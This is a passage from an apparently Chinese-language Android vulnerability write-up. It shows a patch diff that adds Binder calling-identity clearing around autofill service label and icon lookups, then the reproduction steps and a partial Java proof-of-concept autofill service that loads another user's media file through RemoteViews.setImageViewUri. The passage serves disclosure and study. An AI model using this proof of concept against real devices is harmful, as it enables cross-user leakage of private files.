<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B07D48;--shiki-dark:#BD976A">                        mService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getMaster</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">                                .</span><span style="color:#59873A;--shiki-dark:#80A665">getContext</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">                                .</span><span style="color:#59873A;--shiki-dark:#80A665">getPackageManager</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">                                .</span><span style="color:#59873A;--shiki-dark:#80A665">getDrawable</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B07D48;--shiki-dark:#BD976A">                                        mService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getServicePackageName</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> iconResourceId</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span><span style="color:#1E754F;--shiki-dark:#4D9375"> finally</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B07D48;--shiki-dark:#BD976A">                Binder</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">restoreCallingIdentity</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">token</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//新增</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">         </span><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#4C9A91">2.</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">         if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">customServiceNameId </span><span style="color:#AB5959;--shiki-dark:#CB7676">!=</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 0</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            serviceLabel </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getMaster</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getContext</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getPackageManager</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">getText</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#B07D48;--shiki-dark:#BD976A">                    mService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getServicePackageName</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                    customServiceNameId</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#1E754F;--shiki-dark:#4D9375">                    null</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">            long</span><span style="color:#B07D48;--shiki-dark:#BD976A"> token</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> Binder</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">clearCallingIdentity</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">            try</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                serviceLabel </span><span style="color:#999999;--shiki-dark:#666666">=</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B07D48;--shiki-dark:#BD976A">                        mService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getMaster</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">                                .</span><span style="color:#59873A;--shiki-dark:#80A665">getContext</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">                                .</span><span style="color:#59873A;--shiki-dark:#80A665">getPackageManager</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">                                .</span><span style="color:#59873A;--shiki-dark:#80A665">getText</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B07D48;--shiki-dark:#BD976A">                                        mService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getServicePackageName</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                                        customServiceNameId</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">                                        null</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span><span style="color:#1E754F;--shiki-dark:#4D9375"> finally</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B07D48;--shiki-dark:#BD976A">                Binder</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">restoreCallingIdentity</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">token</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">         </span><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span></code></pre>
<h2 id="二-漏洞复现"><a class="anchor" href="#二-漏洞复现">#</a> (二) 漏洞复现</h2>
<p>刷机到打补丁前的版本</p>
<p>&lt;img src="<a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2025/png/35603403/1767102709080-91ca0766-2233-4781-9f11-58981b7c7c85.png">https://cdn.nlark.com/yuque/0/2025/png/35603403/1767102709080-91ca0766-2233-4781-9f11-58981b7c7c85.png</a>" alt="img" style="zoom:33%;" /&gt;</p>
<p>poc：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">package</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> com</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">example</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofillpoc</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">assist</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">AssistStructure</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">net</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Uri</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">service</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">AutofillService</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">service</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">FillCallback</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">service</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">FillRequest</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">service</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">FillResponse</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">service</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Dataset</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">view</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">AutofillId</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">view</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">AutofillValue</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">widget</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">RemoteViews</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Log</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> class</span><span style="color:#2E8F82;--shiki-dark:#5DA994"> LeakAutofillService</span><span style="color:#AB5959;--shiki-dark:#CB7676"> extends</span><span style="color:#59873A;--shiki-dark:#80A665"> AutofillService</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#AB5959;--shiki-dark:#CB7676"> static</span><span style="color:#AB5959;--shiki-dark:#CB7676"> final</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> TAG</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">AutofillLeakPoC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> onFillRequest</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            FillRequest </span><span style="color:#B07D48;--shiki-dark:#BD976A">request</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">CancellationSignal </span><span style="color:#B07D48;--shiki-dark:#BD976A">cancellationSignal</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            FillCallback </span><span style="color:#B07D48;--shiki-dark:#BD976A">callback</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        AssistStructure</span><span style="color:#B07D48;--shiki-dark:#BD976A"> structure</span><span style="color:#999999;--shiki-dark:#666666"> =</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                request</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getFillContexts</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                        .</span><span style="color:#59873A;--shiki-dark:#80A665">get</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">request</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getFillContexts</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">size</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#AB5959;--shiki-dark:#CB7676"> -</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 1</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                        .</span><span style="color:#59873A;--shiki-dark:#80A665">getStructure</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        AutofillId</span><span style="color:#B07D48;--shiki-dark:#BD976A"> targetId</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#59873A;--shiki-dark:#80A665"> findFirstInput</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">structure</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">targetId </span><span style="color:#AB5959;--shiki-dark:#CB7676">==</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            callback</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">onSuccess</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#1E754F;--shiki-dark:#4D9375">null</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">            return</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        RemoteViews</span><span style="color:#B07D48;--shiki-dark:#BD976A"> rv</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#59873A;--shiki-dark:#80A665"> RemoteViews</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">                getPackageName</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                R</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">layout</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">autofill_view</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // ⚠️ 关键点：URI 指向 User 0 中的媒体</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        Uri</span><span style="color:#B07D48;--shiki-dark:#BD976A"> leakedImage</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> Uri</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">parse</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span></span>
<span class="line"><span style="color:#B5695977;--shiki-dark:#C98A7D77">                "</span><span style="color:#B56959;--shiki-dark:#C98A7D">file:///storage/emulated/0/Android/data/com.example.autofillpoc/files/secret.jpg</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        rv</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">setImageViewUri</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">R</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">id</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">leak_image</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> leakedImage</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        rv</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">setImageViewUri</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">R</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">id</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">leak_image</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> leakedImage</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        Dataset</span><span style="color:#B07D48;--shiki-dark:#BD976A"> dataset</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> Dataset</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">Builder</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">rv</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">setValue</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">targetId</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                        AutofillValue</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">forText</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">test</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                        rv</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">build</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        FillResponse</span><span style="color:#B07D48;--shiki-dark:#BD976A"> response</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> FillResponse</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">Builder</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">addDataset</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">dataset</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
